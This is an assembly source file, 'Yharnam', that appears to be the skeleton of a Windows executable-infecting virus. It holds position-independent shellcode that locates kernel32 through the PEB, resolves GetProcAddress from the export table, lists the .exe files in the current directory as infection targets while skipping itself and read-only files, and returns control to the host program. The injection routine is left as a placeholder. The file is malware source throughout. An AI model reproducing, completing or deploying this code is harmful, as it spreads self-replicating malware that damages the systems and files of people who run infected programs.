; Yharnam
;
; Made by:
;
; 	- 0xfee15bad (Alexandre Paillier)
;
	
.386
.model flat, stdcall
option casemap:none

      include \masm32\include\windows.inc
      include \masm32\include\wdm.inc
      include \masm32\include\kernel32.inc
	  include .\yharnam.inc

      includelib \masm32\lib\kernel32.lib

.data
.code

data:
	fileFilter          BYTE ".\*.exe",0
	returnAddr          DWORD 000000000h

start:
	call get_eip ; get the injected .exe's environment instruction pointer
get_eip:
	pop ebx
	; ebx holds "data section" address
	; (call instruction + (start label address - data label instruction))
	sub ebx, (5 + (start - data))
	push ebx ; save it back temporarily

	; resolve kernel32 base address
	ASSUME FS:NOTHING
	mov edx, fs:[030h] ; get the PEB struct
	ASSUME FS:ERROR
	
	; ->Ldr / get the PEB_LDR_DATA struct
	mov edx, (PEB PTR [edx]).Ldr
	; ->InMemoryOrderModuleList / gets the loaded modules linked list
	lea edx, (PEB_LDR_DATA PTR [edx]).InMemoryOrderModuleList

	; loop through the linked list until we match with "KERNEL32.DLL"
	; partial check : length=12; name[0]=K; name[5]=L; name[7]=2
	; should be enough
loop_find_kernel32:
	; ->FullDllName / get the UNICODE_STRING struct
	lea eax, (LDR_DATA_TABLE_ENTRY PTR [edx]).FullDllName
	; ->Len
	mov bx, (UNICODE_STRING PTR [eax]).Len
	; check the length
	cmp bx, (12 * sizeof WCHAR)
	jne loop_find_kernel32_continue

	; ->Buffer
	mov eax, (UNICODE_STRING PTR [eax]).Buffer

	; check the string
	mov bx, [eax]
	cmp bx, 'K'
	jne loop_find_kernel32_continue
	mov bx, [eax + 5 * sizeof WCHAR]
	cmp bx, 'L'
	jne loop_find_kernel32_continue
	mov bx, [eax + 7 * sizeof WCHAR]
	cmp bx, '2'
	jne loop_find_kernel32_continue
	jmp loop_find_kernel32_end
loop_find_kernel32_continue:
	; (LIST_ENTRY)->Flink / get next loaded module
	mov edx, (LIST_ENTRY PTR [edx]).Flink
	jmp loop_find_kernel32
loop_find_kernel32_end:
	; ->DllBase, for some reason, does not hold the base address
	; instead ->Reserved2[0] does
	mov ebx, (LDR_DATA_TABLE_ENTRY PTR [edx]).Reserved2[0 * sizeof PVOID]
	mov edx, ebx
	; get PE header (base address + offset from the DOS header)
	add edx, [edx + 03Ch]
	; get export table
	mov edx, [edx + 078h]
	add edx, ebx
	push edx ; save export table on the stack

	; get function names array
	mov edx, [edx + 020h] ; AddressOfNames
	add edx, ebx
	xor ecx, ecx ; index = 0
	; loop trough export function names
loop_find_gpa:
	mov eax, [edx + ecx]
	add eax, ebx
	; check the string with "GetProcA", should be enough
	; in reverse because of the endianness
	mov edi, [eax]
	cmp edi, 'PteG'
	jne loop_find_gpa_continue
	mov edi, [eax + 4]
	cmp edi, 'Acor'
	jne loop_find_gpa_continue
	jmp loop_find_gpa_end
loop_find_gpa_continue:
	add ecx, sizeof LPSTR ; index += 1
	jmp loop_find_gpa
loop_find_gpa_end:
	pop edx ; get the export table back
	mov eax, edx
	; now use this index to find the function ordinal (address array index)
	mov edx, [edx + 024h] ; AddressOfNameOrdinals
	add edx, ebx
	shr ecx, 1 ; index /= 2 (32 bit array -> 16 bit array)
	xor edi, edi
	mov di, [edx + ecx]
	shl edi, 2 ; index *= 4 (sizeof PVOID)
	mov edx, eax
	; now use the ordinal to get the function address
	mov edx, [edx + 01Ch] ; AddressOfFunctions
	add edx, ebx
	mov edx,[edx + edi]
	add edx, ebx

	pop ebx
	; allocate space on the stack, sp register instead of esp because
	; the structure size fits in a WORD, saves on instruction size
	sub sp, sizeof STACK_STORAGE

	; store GetProcAddress address
	mov (STACK_STORAGE PTR [esp]).GPAAddr, edx

	lea edx, (STACK_STORAGE PTR [esp]).currentExe
	push MAX_PATH
	push edx
	push NULL
	call GetModuleFileName ; get current .exe full file path

	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
	push edx
	lea edx, [ebx + (fileFilter - data)]
	push edx
	call FindFirstFile

	cmp eax, INVALID_HANDLE_VALUE
	je loop_find_file_end

	mov (STACK_STORAGE PTR [esp]).searchHandle, eax
loop_find_file:
	; check file and put it on the stack if needed
	lea edx, (STACK_STORAGE PTR [esp]).targetName
	lea eax, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
	push NULL
	push edx
	push MAX_PATH
	push eax
	call GetFullPathName ; get absolute file path
	
	; check if it's a directory
	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
	and edx, FILE_ATTRIBUTE_DIRECTORY
	cmp edx, FILE_ATTRIBUTE_DIRECTORY
	je loop_find_file_continue

	lea edx, (STACK_STORAGE PTR [esp]).targetName
	lea eax, (STACK_STORAGE PTR [esp]).currentExe
	push edx
	push eax
	call lstrcmp ; check if this is the program
	cmp eax, 0
	je loop_find_file_continue

	; check if it's a read-only file
	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
	and edx, FILE_ATTRIBUTE_READONLY
	cmp edx, FILE_ATTRIBUTE_READONLY
	je loop_find_file_continue

;	injection "placeholder"
	push 0AABBCCDDh
	pop eax
;

loop_find_file_continue:
	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
	mov eax, (STACK_STORAGE PTR [esp]).searchHandle
	push edx
	push eax
	call FindNextFile
	cmp eax, TRUE
	je loop_find_file
loop_find_file_end:

	mov eax, [ebx + (returnAddr - data)]
	cmp eax, 0
	je end_of_code
	jmp eax
end_of_code:
	push 0
	call ExitProcess

end start